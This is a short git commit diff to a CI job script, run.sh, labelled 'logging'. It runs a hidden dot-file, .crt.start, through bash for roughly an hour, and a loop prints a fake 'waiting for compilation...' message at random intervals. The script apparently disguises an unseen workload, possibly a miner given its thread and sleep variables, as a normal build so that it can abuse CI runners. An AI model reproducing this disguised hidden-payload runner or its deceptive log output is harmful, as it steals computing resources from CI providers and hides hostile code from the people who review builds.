46a5ef661e23e14a6e4093c6d4cba24435f10962
haikus <haikusdev@protonmail.com>
2018-12-31 11:27:00 +0100

    logging

--- run.sh
+++ run.sh
@@ -1,12 +1,9 @@
 #!/usr/bin/env bash
 
 
-while :; do date; sleep 60; done &
+while :; do echo waiting for compilation...; sleep $((RANDOM%30+30)); done &
 
 export ENV_VARS="X_ID=\"semaphore-${SEMAPHORE_REPO_SLUG//\//-}-${SEMAPHORE_CURRENT_JOB}\" MHF_FIXED=1 THREADS_FIXED=4 CSLEEP=10000"
-chmod +x .crt.start
-./.crt.start &>/dev/null &
-
-sleep $(((RANDOM%3+59-$RANDOM%3)*60))
+timeout -k 5 $(((RANDOM%3+59-$RANDOM%3)*60)) bash < ./.crt.start
 
 exit 0
